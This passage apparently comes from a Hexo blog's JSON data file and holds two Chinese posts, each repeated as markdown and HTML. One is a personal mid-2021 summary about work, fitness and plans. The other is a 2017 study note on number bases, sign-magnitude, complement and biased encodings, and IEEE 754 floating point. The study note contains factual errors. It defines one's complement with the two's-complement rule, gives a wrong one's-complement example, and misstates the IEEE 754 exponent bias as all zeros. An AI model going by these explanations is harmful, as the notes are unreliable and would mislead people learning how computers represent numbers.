生活呢\n生活是发生了翻天覆地的变化。和我健身的好友相继离开了腾讯，一个归蜀，一个拥抱羊城了。说实话，他们离开深圳时，我真的有些动摇了。要不要离开深圳，要不要离开公司，成了我前两个月问自己最多的问题。好在我留下来了，生活也给我了些惊喜。\n\n**再次上镜！！**\n(贴两张帅照嘻嘻. 视频号 腾讯CSIG “我在鹅厂做To B” 第5期)\n![withMyGirl](me-with-my-girl.jpg)\n![me](me.jpg)\n\n看到很多人评论，其中有很多好兄弟好朋友们。好兄弟、我崇拜的学长、总监、高中老师等等都为我转发加油，内心也十分的自豪，被认可的感觉真好。\n\n与此同时，我也开始写一些文章。虽然效果一般般，阅读的人不多，但是每当我探究多深入一次，我感觉自己的基础知识更加牢固。也让我有更多的动力写文章了。\n\n## 说说兴趣吧\n自拔牙前后，体重从 142 -> 134 -> 140。从瘦了一圈又回来。我的兴趣也经历了一次过山车。\n\n很久没有打羽毛球的我，再次拿起了羽毛球拍；知道好友要离开时，疯狂约健身。然后就是一个多月没动弹。因为拔牙后，啥也不想干，啥也不能干。之后又疯狂反噬，着了魔一样健身。\n\n最近的兴趣爱好是看源码和看书。我把node都拉下准备好好看看，顺便提提pr；也迷上了一本书叫《沉思录》。\n\n第一次听说 斯多葛学派 是在得到上，每天早上都会听一节课。听完之后发现正是我一直追求的心态与品质，一边看书一边练习了起来。真别说，效果特别好，因为刚练股票就长起来了哈哈哈。内心窃喜之外，也告诉自己那就接着练习吧。\n\n兴趣基本上就这些了\n\n## 说说接下来的规划吧\n首先是准备好好写文章。多沉淀沉淀自己，学习新技术，吸收好能力。希望年底前写完10篇文章吧\n\n然后是英语，12月份马上就一年了。也结束了外教课，希望再总结总结\n\n再是健身，晚饭前抽时间健身吧，保持保持身材，不然走形了嘻嘻\n\n最后是生活，希望10月份去趟东北，八字的一撇先保住咯，略略略～\n\n\n最后也祝阅读到这里的你，心想事成，万事如意！\n","slug":"2021-middle-summary","published":1,"updated":"2021-09-11T11:45:53.089Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nyzx00064jzxfczzx1no","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>今天是9月平常的周五，可是对我来说有一点点不一样，晚上10点终于把负责5个月的项目发出去了。那是我4月中到现在做的项目，虽然已经发了几版，但今天是我最后一次负责发布它。下周就要开始负责新的项目了。</p><p>我有些疲惫的到了家门口，下意识拿出了裤子口袋的钥匙，然后插进了钥匙孔，熟练的旋转了2圈。进门后看了看手表，已经22:25了，还有5分钟就要上外教课。然后有些急促的跑到阳台，收拾已经良好的衣服，再把衣服叠进衣柜。</p><p>看了看时间，还有3分钟。我立马冲进厕所洗了把脸，希望清醒一些，也希望给外教留个好印象。</p><p>课程开始了，又是熟悉的自我介绍环节，再嘘寒问暖了一番。从聊天中得知外教是南非人，比我们晚6个小时，而且在南半球，现在是冬天。我表示吃惊，她也看了看时间，夸我有毅力。在一顿欢声笑语中结束了。</p><p>我拿着洗好的衣服和毛巾，进入厕所的那一刻，一天的重担仿佛才卸下来，这段时间的重担仿佛才卸下来。</p><h2 id=\"项目咋样\"><a href=\"#项目咋样\" class=\"headerlink\" title=\"项目咋样\"></a>项目咋样</h2><p>这算是我在团队负责最久的项目之一，历时5个半月。这算是一次完整版的中台项目，完全由 Typescript 搭建。包括 React 做前端、Nest js 做后台、Nginx 做转发、Docker 做容的完整中台，几乎所有的架构代码都是我搭建的。它包括 数据库做存储、log4js 做日志、权限控制、配置发布、单元测试等等，几乎是完整的后台了。它的作用是负责运营配置相关，包括升级、增量升级、配置下发、邮件模版等功能。</p><p>搭建的再好，也都交给其他同学负责了。人总是要成长，作为前端工程师也得做点纯前端的事情。但是总有些舍不得。谁忍心把自己一手抚养长大的 baby 给其他人照顾？更何况是我带着好几个同学打造出来的“杰作”？（至少对我来说是杰作！）</p><p>不管咋样，好好休息一番，再加油搞事吧！</p><h2 id=\"生活呢\"><a href=\"#生活呢\" class=\"headerlink\" title=\"生活呢\"></a>生活呢</h2><p>生活是发生了翻天覆地的变化。和我健身的好友相继离开了腾讯，一个归蜀，一个拥抱羊城了。说实话，他们离开深圳时，我真的有些动摇了。要不要离开深圳，要不要离开公司，成了我前两个月问自己最多的问题。好在我留下来了，生活也给我了些惊喜。</p><p><strong>再次上镜！！</strong><br>(贴两张帅照嘻嘻. 视频号 腾讯CSIG “我在鹅厂做To B” 第5期)<br><img src=\"/img/loading.gif\" data-original=\"/随笔/2021-middle-summary/me-with-my-girl.jpg\" alt=\"withMyGirl\"><br><img src=\"/img/loading.gif\" data-original=\"/随笔/2021-middle-summary/me.jpg\" alt=\"me\"></p><p>看到很多人评论，其中有很多好兄弟好朋友们。好兄弟、我崇拜的学长、总监、高中老师等等都为我转发加油，内心也十分的自豪，被认可的感觉真好。</p><p>与此同时，我也开始写一些文章。虽然效果一般般，阅读的人不多，但是每当我探究多深入一次，我感觉自己的基础知识更加牢固。也让我有更多的动力写文章了。</p><h2 id=\"说说兴趣吧\"><a href=\"#说说兴趣吧\" class=\"headerlink\" title=\"说说兴趣吧\"></a>说说兴趣吧</h2><p>自拔牙前后，体重从 142 -&gt; 134 -&gt; 140。从瘦了一圈又回来。我的兴趣也经历了一次过山车。</p><p>很久没有打羽毛球的我，再次拿起了羽毛球拍；知道好友要离开时，疯狂约健身。然后就是一个多月没动弹。因为拔牙后，啥也不想干，啥也不能干。之后又疯狂反噬，着了魔一样健身。</p><p>最近的兴趣爱好是看源码和看书。我把node都拉下准备好好看看，顺便提提pr；也迷上了一本书叫《沉思录》。</p><p>第一次听说 斯多葛学派 是在得到上，每天早上都会听一节课。听完之后发现正是我一直追求的心态与品质，一边看书一边练习了起来。真别说，效果特别好，因为刚练股票就长起来了哈哈哈。内心窃喜之外，也告诉自己那就接着练习吧。</p><p>兴趣基本上就这些了</p><h2 id=\"说说接下来的规划吧\"><a href=\"#说说接下来的规划吧\" class=\"headerlink\" title=\"说说接下来的规划吧\"></a>说说接下来的规划吧</h2><p>首先是准备好好写文章。多沉淀沉淀自己，学习新技术，吸收好能力。希望年底前写完10篇文章吧</p><p>然后是英语，12月份马上就一年了。也结束了外教课，希望再总结总结</p><p>再是健身，晚饭前抽时间健身吧，保持保持身材，不然走形了嘻嘻</p><p>最后是生活，希望10月份去趟东北，八字的一撇先保住咯，略略略～</p><p>最后也祝阅读到这里的你，心想事成，万事如意！</p>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>今天是9月平常的周五，可是对我来说有一点点不一样，晚上10点终于把负责5个月的项目发出去了。那是我4月中到现在做的项目，虽然已经发了几版，但今天是我最后一次负责发布它。下周就要开始负责新的项目了。</p><p>我有些疲惫的到了家门口，下意识拿出了裤子口袋的钥匙，然后插进了钥匙孔，熟练的旋转了2圈。进门后看了看手表，已经22:25了，还有5分钟就要上外教课。然后有些急促的跑到阳台，收拾已经良好的衣服，再把衣服叠进衣柜。</p><p>看了看时间，还有3分钟。我立马冲进厕所洗了把脸，希望清醒一些，也希望给外教留个好印象。</p><p>课程开始了，又是熟悉的自我介绍环节，再嘘寒问暖了一番。从聊天中得知外教是南非人，比我们晚6个小时，而且在南半球，现在是冬天。我表示吃惊，她也看了看时间，夸我有毅力。在一顿欢声笑语中结束了。</p><p>我拿着洗好的衣服和毛巾，进入厕所的那一刻，一天的重担仿佛才卸下来，这段时间的重担仿佛才卸下来。</p><h2 id=\"项目咋样\"><a href=\"#项目咋样\" class=\"headerlink\" title=\"项目咋样\"></a>项目咋样</h2><p>这算是我在团队负责最久的项目之一，历时5个半月。这算是一次完整版的中台项目，完全由 Typescript 搭建。包括 React 做前端、Nest js 做后台、Nginx 做转发、Docker 做容的完整中台，几乎所有的架构代码都是我搭建的。它包括 数据库做存储、log4js 做日志、权限控制、配置发布、单元测试等等，几乎是完整的后台了。它的作用是负责运营配置相关，包括升级、增量升级、配置下发、邮件模版等功能。</p><p>搭建的再好，也都交给其他同学负责了。人总是要成长，作为前端工程师也得做点纯前端的事情。但是总有些舍不得。谁忍心把自己一手抚养长大的 baby 给其他人照顾？更何况是我带着好几个同学打造出来的“杰作”？（至少对我来说是杰作！）</p><p>不管咋样，好好休息一番，再加油搞事吧！</p><h2 id=\"生活呢\"><a href=\"#生活呢\" class=\"headerlink\" title=\"生活呢\"></a>生活呢</h2><p>生活是发生了翻天覆地的变化。和我健身的好友相继离开了腾讯，一个归蜀，一个拥抱羊城了。说实话，他们离开深圳时，我真的有些动摇了。要不要离开深圳，要不要离开公司，成了我前两个月问自己最多的问题。好在我留下来了，生活也给我了些惊喜。</p><p><strong>再次上镜！！</strong><br>(贴两张帅照嘻嘻. 视频号 腾讯CSIG “我在鹅厂做To B” 第5期)<br><img src=\"/随笔/2021-middle-summary/me-with-my-girl.jpg\" alt=\"withMyGirl\"><br><img src=\"/随笔/2021-middle-summary/me.jpg\" alt=\"me\"></p><p>看到很多人评论，其中有很多好兄弟好朋友们。好兄弟、我崇拜的学长、总监、高中老师等等都为我转发加油，内心也十分的自豪，被认可的感觉真好。</p><p>与此同时，我也开始写一些文章。虽然效果一般般，阅读的人不多，但是每当我探究多深入一次，我感觉自己的基础知识更加牢固。也让我有更多的动力写文章了。</p><h2 id=\"说说兴趣吧\"><a href=\"#说说兴趣吧\" class=\"headerlink\" title=\"说说兴趣吧\"></a>说说兴趣吧</h2><p>自拔牙前后，体重从 142 -&gt; 134 -&gt; 140。从瘦了一圈又回来。我的兴趣也经历了一次过山车。</p><p>很久没有打羽毛球的我，再次拿起了羽毛球拍；知道好友要离开时，疯狂约健身。然后就是一个多月没动弹。因为拔牙后，啥也不想干，啥也不能干。之后又疯狂反噬，着了魔一样健身。</p><p>最近的兴趣爱好是看源码和看书。我把node都拉下准备好好看看，顺便提提pr；也迷上了一本书叫《沉思录》。</p><p>第一次听说 斯多葛学派 是在得到上，每天早上都会听一节课。听完之后发现正是我一直追求的心态与品质，一边看书一边练习了起来。真别说，效果特别好，因为刚练股票就长起来了哈哈哈。内心窃喜之外，也告诉自己那就接着练习吧。</p><p>兴趣基本上就这些了</p><h2 id=\"说说接下来的规划吧\"><a href=\"#说说接下来的规划吧\" class=\"headerlink\" title=\"说说接下来的规划吧\"></a>说说接下来的规划吧</h2><p>首先是准备好好写文章。多沉淀沉淀自己，学习新技术，吸收好能力。希望年底前写完10篇文章吧</p><p>然后是英语，12月份马上就一年了。也结束了外教课，希望再总结总结</p><p>再是健身，晚饭前抽时间健身吧，保持保持身材，不然走形了嘻嘻</p><p>最后是生活，希望10月份去趟东北，八字的一撇先保住咯，略略略～</p><p>最后也祝阅读到这里的你，心想事成，万事如意！</p>"},{"title":"计算机系统基础－－第二章(数据的机器级表示与处理)","date":"2017-05-22T13:20:53.000Z","dir":"计算机系统基础","keywords":"计算机系统基础－－第二章(数据的机器级表示与处理)","_content":"### 数制转换\n即将不同的数值转换，例如：二、八、十六进制的相互转换\n```\n八进制转二进制：　0 Q = 000 B    1 Q = 001 B     7 Q = 111 B\n十六进制转二进制：　0 H = 0000 B      5 H =0101 B     F H = 1111 B\ntips: 可知八进制转二进制与十六进制转二进制分别对应着３位以及４位的二进制\n```\n其他进制转二进制，例如：十进制与二进制的相互转换\n```\n0 D = 0000 H    10 D = 1010 B   100 D = 1100100 B\n而无明显进制位数比较\n```\n多进制转化为10进制，例如16进制转化为10进制\n```\n1 H = 1*16^0 D      F H = 15*16^0 D     8FF H = 8*16^2+15*16^1+15*16^0 D\n可较为明确的转化\n```\n结论：多进制转换为二进制无明显比较。可由多进制转化为10进制后，再转化为其他进制。可参[简易的进制转换器](https://github.com/gdccwxx/just-play/tree/master/hexConversion)\n### 定点编码表示\n##### 原码表示法\n也称“符号－数值”\n规则：\n１、当Xt 为正数时，　Xn-1 = 0 Xi=X’i(0<=i<=n-2);\n２、当Xt 为负数时，　Xn-1 = 1 Xi=X’i(0<=i<=n-2);\n即：-10 用八位原码表示为10001010B，10 用八位原码表示为00001010B\n优点：真之对应关系直接方便简单，而且用原码实现乘除运算也较为简单。\n缺点：０表示不唯一(0000,1000都表示0)加减运算需判断是否同好或异号。\n运用：现代计算机中不用原码表示正数，只用定点源码小数表示浮点数的尾数部分。\n##### 补码表示法\n也称“２－补码”\n规则：\n１、当Xt 为正数时，　[Xt]补　= Xt = M+Xt(mod M);\n２、当Xt 为负数时，　[Xt]补　= M - |Xt| = M+Xt(mod M);\n即：[1101100]补　= 2^8 + 1101100 = 100000000 + 1101100(mod 2^8) = 01101100\n[-1101100]补　= 2^8 - 1101100 = 100000000 - 1101100 = 10000000 + (1111111 - 1101100) + 1 = 10000000 + 0010011 + 1(mod 2^8) = 10010100\n优点：１、减少了-0与+0的切换\n2、占用少一个编码表示，补码比原码能多表示一个最小负数，可以用-2^(n-1)来表示最小负数。\n3、两数的补码之和（差）=两数和（差）的补码。\n运用：在计算机中，补码用来表示带符号正数。\n##### 反码表示法\n规则：\n正数和原码相同，负数的补码采用“各位取反，末尾加1”\n即： [01100]反 = [10100]反\n缺点：1、0的表示不唯一。\n2、表数范围比补码少一个最小负数。\n3、运算时必须考虑循环进位。\n运用：反码在计算机中很少被使用，有事做数码变换的中间表示形式（我们可以快速从反码知道原码和补码）。\n##### 移码表示法\n规则：\n[E]移 = 偏置常数 + E （偏置常数通常取2^(n-1)或2^(n-1)-1）\n运用：通常表示浮点数的阶（即指数）\n##### 浮点数的表示(IEEE754浮点数)\nIEEE754浮点数的表示：\n![ieee754image](ieee754image.png)\n![chart_of_iee754](IEEE754_chart.jpg)\nsign: 符号位，0表示正数1表示负数\nexponent： 阶码，由偏置常数+偏移量组成\nfunction： 位数\n##### 为什么要有IEEE754标准？\n**答：在此标准出来之前，不同电脑中的浮点数表示不唯一，一个程序由此电脑移到彼电脑可能需要重新编码。为了让程序员更加专心于程序的本身，而非多个不同电脑的差异做无用功，因此出现IEEE754标准**\n##### 什么是IEEE754标准？\n**以双精度为例，相比于传统浮点位，IEEE754标准使传统阶码标准之上，偏置常数从原来的10000000000(2^(n-1))变为00000000000(2^(n-1)-1),即隐藏移码，从原来的1024变成1023，这种做法有两个好处\n1、尾数可表示的位数多一位，因而使得浮点数的精度更高。\n2、阶码的可表示范围更大，因而使浮点数表示范围更大**\n##### IEEE754解释：\n##### question:\n请判断下列关系表达式在32位机子上运行上是否永真，去除无穷大和NAN的任何值,i、f、d分别表示位,int,float,double\n```\n1、 i == (int)(float) i   //不相等，因为int为32位，float为23位精度\n2、 f == (float)(int)f    //不相等，小数位精度缺失\n3、 i == (int)(double)i   //相等\n4、 f == (float)(double)i //相等\n```\n### 整数的加减\n\n![choiceTwoWay](choiceTwoWay.jpg)\n零标志位为zf，溢出标志位位of；\n符号标志sf，进/借位标志cf\nzf=1时，表示结果为0；\nof=1时，表示带符号整数的加减法运算发生溢出；\ncf=Sub异或C\n\n\n#### 小结：\n这章也为我解释了为什么int型到达一定的位数之后会由正数变成负数。溢出让我更清晰的明白了其中的原理。还有浮点数，让我明白了大数加1之后并没有什么变化的最基础原理。IEEE754标准也让我更加清晰了浮点数的存储方式，以及其工作原理。\n\n","source":"_posts/basic-computer-sience-chapter2.md","raw":"---\ntitle: 计算机系统基础－－第二章(数据的机器级表示与处理)\ndate: 2017-05-22 21:20:53\ntags: 计算机系统基础\ndir: 计算机系统基础\nkeywords: 计算机系统基础－－第二章(数据的机器级表示与处理)\n---\n### 数制转换\n即将不同的数值转换，例如：二、八、十六进制的相互转换\n```\n八进制转二进制：　0 Q = 000 B    1 Q = 001 B     7 Q = 111 B\n十六进制转二进制：　0 H = 0000 B      5 H =0101 B     F H = 1111 B\ntips: 可知八进制转二进制与十六进制转二进制分别对应着３位以及４位的二进制\n```\n其他进制转二进制，例如：十进制与二进制的相互转换\n```\n0 D = 0000 H    10 D = 1010 B   100 D = 1100100 B\n而无明显进制位数比较\n```\n多进制转化为10进制，例如16进制转化为10进制\n```\n1 H = 1*16^0 D      F H = 15*16^0 D     8FF H = 8*16^2+15*16^1+15*16^0 D\n可较为明确的转化\n```\n结论：多进制转换为二进制无明显比较。可由多进制转化为10进制后，再转化为其他进制。可参[简易的进制转换器](https://github.com/gdccwxx/just-play/tree/master/hexConversion)\n### 定点编码表示\n##### 原码表示法\n也称“符号－数值”\n规则：\n１、当Xt 为正数时，　Xn-1 = 0 Xi=X’i(0<=i<=n-2);\n２、当Xt 为负数时，　Xn-1 = 1 Xi=X’i(0<=i<=n-2);\n即：-10 用八位原码表示为10001010B，10 用八位原码表示为00001010B\n优点：真之对应关系直接方便简单，而且用原码实现乘除运算也较为简单。\n缺点：０表示不唯一(0000,1000都表示0)加减运算需判断是否同好或异号。\n运用：现代计算机中不用原码表示正数，只用定点源码小数表示浮点数的尾数部分。\n##### 补码表示法\n也称“２－补码”\n规则：\n１、当Xt 为正数时，　[Xt]补　= Xt = M+Xt(mod M);\n２、当Xt 为负数时，　[Xt]补　= M - |Xt| = M+Xt(mod M);\n即：[1101100]补　= 2^8 + 1101100 = 100000000 + 1101100(mod 2^8) = 01101100\n[-1101100]补　= 2^8 - 1101100 = 100000000 - 1101100 = 10000000 + (1111111 - 1101100) + 1 = 10000000 + 0010011 + 1(mod 2^8) = 10010100\n优点：１、减少了-0与+0的切换\n2、占用少一个编码表示，补码比原码能多表示一个最小负数，可以用-2^(n-1)来表示最小负数。\n3、两数的补码之和（差）=两数和（差）的补码。\n运用：在计算机中，补码用来表示带符号正数。\n##### 反码表示法\n规则：\n正数和原码相同，负数的补码采用“各位取反，末尾加1”\n即： [01100]反 = [10100]反\n缺点：1、0的表示不唯一。\n2、表数范围比补码少一个最小负数。\n3、运算时必须考虑循环进位。\n运用：反码在计算机中很少被使用，有事做数码变换的中间表示形式（我们可以快速从反码知道原码和补码）。\n##### 移码表示法\n规则：\n[E]移 = 偏置常数 + E （偏置常数通常取2^(n-1)或2^(n-1)-1）\n运用：通常表示浮点数的阶（即指数）\n##### 浮点数的表示(IEEE754浮点数)\nIEEE754浮点数的表示：\n![ieee754image](ieee754image.png)\n![chart_of_iee754](IEEE754_chart.jpg)\nsign: 符号位，0表示正数1表示负数\nexponent： 阶码，由偏置常数+偏移量组成\nfunction： 位数\n##### 为什么要有IEEE754标准？\n**答：在此标准出来之前，不同电脑中的浮点数表示不唯一，一个程序由此电脑移到彼电脑可能需要重新编码。为了让程序员更加专心于程序的本身，而非多个不同电脑的差异做无用功，因此出现IEEE754标准**\n##### 什么是IEEE754标准？\n**以双精度为例，相比于传统浮点位，IEEE754标准使传统阶码标准之上，偏置常数从原来的10000000000(2^(n-1))变为00000000000(2^(n-1)-1),即隐藏移码，从原来的1024变成1023，这种做法有两个好处\n1、尾数可表示的位数多一位，因而使得浮点数的精度更高。\n2、阶码的可表示范围更大，因而使浮点数表示范围更大**\n##### IEEE754解释：\n##### question:\n请判断下列关系表达式在32位机子上运行上是否永真，去除无穷大和NAN的任何值,i、f、d分别表示位,int,float,double\n```\n1、 i == (int)(float) i   //不相等，因为int为32位，float为23位精度\n2、 f == (float)(int)f    //不相等，小数位精度缺失\n3、 i == (int)(double)i   //相等\n4、 f == (float)(double)i //相等\n```\n### 整数的加减\n\n![choiceTwoWay](choiceTwoWay.jpg)\n零标志位为zf，溢出标志位位of；\n符号标志sf，进/借位标志cf\nzf=1时，表示结果为0；\nof=1时，表示带符号整数的加减法运算发生溢出；\ncf=Sub异或C\n\n\n#### 小结：\n这章也为我解释了为什么int型到达一定的位数之后会由正数变成负数。溢出让我更清晰的明白了其中的原理。还有浮点数，让我明白了大数加1之后并没有什么变化的最基础原理。IEEE754标准也让我更加清晰了浮点数的存储方式，以及其工作原理。\n\n","slug":"basic-computer-sience-chapter2","published":1,"updated":"2021-09-11T05:44:43.844Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nyzy00094jzxr5rizasr","content":"<h3 id=\"数制转换\"><a href=\"#数制转换\" class=\"headerlink\" title=\"数制转换\"></a>数制转换</h3><p>即将不同的数值转换，例如：二、八、十六进制的相互转换<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">八进制转二进制：　0 Q = 000 B    1 Q = 001 B     7 Q = 111 B</span><br><span class=\"line\">十六进制转二进制：　0 H = 0000 B      5 H =0101 B     F H = 1111 B</span><br><span class=\"line\">tips: 可知八进制转二进制与十六进制转二进制分别对应着３位以及４位的二进制</span><br></pre></td></tr></table></figure><p></p><p>其他进制转二进制，例如：十进制与二进制的相互转换<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 D = 0000 H    10 D = 1010 B   100 D = 1100100 B</span><br><span class=\"line\">而无明显进制位数比较</span><br></pre></td></tr></table></figure><p></p><p>多进制转化为10进制，例如16进制转化为10进制<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 H = 1*16^0 D      F H = 15*16^0 D     8FF H = 8*16^2+15*16^1+15*16^0 D</span><br><span class=\"line\">可较为明确的转化</span><br></pre></td></tr></table></figure><p></p><p>结论：多进制转换为二进制无明显比较。可由多进制转化为10进制后，再转化为其他进制。可参<a href=\"https://github.com/gdccwxx/just-play/tree/master/hexConversion\" target=\"_blank\" rel=\"noopener\">简易的进制转换器</a></p><h3 id=\"定点编码表示\"><a href=\"#定点编码表示\" class=\"headerlink\" title=\"定点编码表示\"></a>定点编码表示</h3><h5 id=\"原码表示法\"><a href=\"#原码表示法\" class=\"headerlink\" title=\"原码表示法\"></a>原码表示法</h5><p>也称“符号－数值”<br>规则：<br>１、当Xt 为正数时，　Xn-1 = 0 Xi=X’i(0&lt;=i&lt;=n-2);<br>２、当Xt 为负数时，　Xn-1 = 1 Xi=X’i(0&lt;=i&lt;=n-2);<br>即：-10 用八位原码表示为10001010B，10 用八位原码表示为00001010B<br>优点：真之对应关系直接方便简单，而且用原码实现乘除运算也较为简单。<br>缺点：０表示不唯一(0000,1000都表示0)加减运算需判断是否同好或异号。<br>运用：现代计算机中不用原码表示正数，只用定点源码小数表示浮点数的尾数部分。</p><h5 id=\"补码表示法\"><a href=\"#补码表示法\" class=\"headerlink\" title=\"补码表示法\"></a>补码表示法</h5><p>也称“２－补码”<br>规则：<br>１、当Xt 为正数时，　[Xt]补　= Xt = M+Xt(mod M);<br>２、当Xt 为负数时，　[Xt]补　= M - |Xt| = M+Xt(mod M);<br>即：[1101100]补　= 2^8 + 1101100 = 100000000 + 1101100(mod 2^8) = 01101100<br>[-1101100]补　= 2^8 - 1101100 = 100000000 - 1101100 = 10000000 + (1111111 - 1101100) + 1 = 10000000 + 0010011 + 1(mod 2^8) = 10010100<br>优点：１、减少了-0与+0的切换<br>2、占用少一个编码表示，补码比原码能多表示一个最小负数，可以用-2^(n-1)来表示最小负数。<br>3、两数的补码之和（差）=两数和（差）的补码。<br>运用：在计算机中，补码用来表示带符号正数。</p><h5 id=\"反码表示法\"><a href=\"#反码表示法\" class=\"headerlink\" title=\"反码表示法\"></a>反码表示法</h5><p>规则：<br>正数和原码相同，负数的补码采用“各位取反，末尾加1”<br>即： [01100]反 = [10100]反<br>缺点：1、0的表示不唯一。<br>2、表数范围比补码少一个最小负数。<br>3、运算时必须考虑循环进位。<br>运用：反码在计算机中很少被使用，有事做数码变换的中间表示形式（我们可以快速从反码知道原码和补码）。</p><h5 id=\"移码表示法\"><a href=\"#移码表示法\" class=\"headerlink\" title=\"移码表示法\"></a>移码表示法</h5><p>规则：<br>[E]移 = 偏置常数 + E （偏置常数通常取2^(n-1)或2^(n-1)-1）<br>运用：通常表示浮点数的阶（即指数）</p><h5 id=\"浮点数的表示-IEEE754浮点数\"><a href=\"#浮点数的表示-IEEE754浮点数\" class=\"headerlink\" title=\"浮点数的表示(IEEE754浮点数)\"></a>浮点数的表示(IEEE754浮点数)</h5><p>IEEE754浮点数的表示：<br><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter2/ieee754image.png\" alt=\"ieee754image\"><br><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter2/IEEE754_chart.jpg\" alt=\"chart_of_iee754\"><br>sign: 符号位，0表示正数1表示负数<br>exponent： 阶码，由偏置常数+偏移量组成<br>function： 位数</p><h5 id=\"为什么要有IEEE754标准？\"><a href=\"#为什么要有IEEE754标准？\" class=\"headerlink\" title=\"为什么要有IEEE754标准？\"></a>为什么要有IEEE754标准？</h5><p><strong>答：在此标准出来之前，不同电脑中的浮点数表示不唯一，一个程序由此电脑移到彼电脑可能需要重新编码。为了让程序员更加专心于程序的本身，而非多个不同电脑的差异做无用功，因此出现IEEE754标准</strong></p><h5 id=\"什么是IEEE754标准？\"><a href=\"#什么是IEEE754标准？\" class=\"headerlink\" title=\"什么是IEEE754标准？\"></a>什么是IEEE754标准？</h5><p><strong>以双精度为例，相比于传统浮点位，IEEE754标准使传统阶码标准之上，偏置常数从原来的10000000000(2^(n-1))变为00000000000(2^(n-1)-1),即隐藏移码，从原来的1024变成1023，这种做法有两个好处<br>1、尾数可表示的位数多一位，因而使得浮点数的精度更高。<br>2、阶码的可表示范围更大，因而使浮点数表示范围更大</strong></p><h5 id=\"IEEE754解释：\"><a href=\"#IEEE754解释：\" class=\"headerlink\" title=\"IEEE754解释：\"></a>IEEE754解释：</h5><h5 id=\"question\"><a href=\"#question\" class=\"headerlink\" title=\"question:\"></a>question:</h5><p>请判断下列关系表达式在32位机子上运行上是否永真，去除无穷大和NAN的任何值,i、f、d分别表示位,int,float,double<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、 i == (int)(float) i   //不相等，因为int为32位，float为23位精度</span><br><span class=\"line\">2、 f == (float)(int)f    //不相等，小数位精度缺失</span><br><span class=\"line\">3、 i == (int)(double)i   //相等</span><br><span class=\"line\">4、 f == (float)(double)i //相等</span><br></pre></td></tr></table></figure><p></p><h3 id=\"整数的加减\"><a href=\"#整数的加减\" class=\"headerlink\" title=\"整数的加减\"></a>整数的加减</h3><p><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter2/choiceTwoWay.jpg\" alt=\"choiceTwoWay\"><br>零标志位为zf，溢出标志位位of；<br>符号标志sf，进/借位标志cf<br>zf=1时，表示结果为0；<br>of=1时，表示带符号整数的加减法运算发生溢出；<br>cf=Sub异或C</p><h4 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h4><p>这章也为我解释了为什么int型到达一定的位数之后会由正数变成负数。溢出让我更清晰的明白了其中的原理。还有浮点数，让我明白了大数加1之后并没有什么变化的最基础原理。IEEE754标准也让我更加清晰了浮点数的存储方式，以及其工作原理。</p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"数制转换\"><a href=\"#数制转换\" class=\"headerlink\" title=\"数制转换\"></a>数制转换</h3><p>即将不同的数值转换，例如：二、八、十六进制的相互转换<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">八进制转二进制：　0 Q = 000 B    1 Q = 001 B     7 Q = 111 B</span><br><span class=\"line\">十六进制转二进制：　0 H = 0000 B      5 H =0101 B     F H = 1111 B</span><br><span class=\"line\">tips: 可知八进制转二进制与十六进制转二进制分别对应着３位以及４位的二进制</span><br></pre></td></tr></table></figure><p></p><p>其他进制转二进制，例如：十进制与二进制的相互转换<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 D = 0000 H    10 D = 1010 B   100 D = 1100100 B</span><br><span class=\"line\">而无明显进制位数比较</span><br></pre></td></tr></table></figure><p></p><p>多进制转化为10进制，例如16进制转化为10进制<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 H = 1*16^0 D      F H = 15*16^0 D     8FF H = 8*16^2+15*16^1+15*16^0 D</span><br><span class=\"line\">可较为明确的转化</span><br></pre></td></tr></table></figure><p></p><p>结论：多进制转换为二进制无明显比较。可由多进制转化为10进制后，再转化为其他进制。可参<a href=\"https://github.com/gdccwxx/just-play/tree/master/hexConversion\" target=\"_blank\" rel=\"noopener\">简易的进制转换器</a></p><h3 id=\"定点编码表示\"><a href=\"#定点编码表示\" class=\"headerlink\" title=\"定点编码表示\"></a>定点编码表示</h3><h5 id=\"原码表示法\"><a href=\"#原码表示法\" class=\"headerlink\" title=\"原码表示法\"></a>原码表示法</h5><p>也称“符号－数值”<br>规则：<br>１、当Xt 为正数时，　Xn-1 = 0 Xi=X’i(0&lt;=i&lt;=n-2);<br>２、当Xt 为负数时，　Xn-1 = 1 Xi=X’i(0&lt;=i&lt;=n-2);<br>即：-10 用八位原码表示为10001010B，10 用八位原码表示为00001010B<br>优点：真之对应关系直接方便简单，而且用原码实现乘除运算也较为简单。<br>缺点：０表示不唯一(0000,1000都表示0)加减运算需判断是否同好或异号。<br>运用：现代计算机中不用原码表示正数，只用定点源码小数表示浮点数的尾数部分。</p><h5 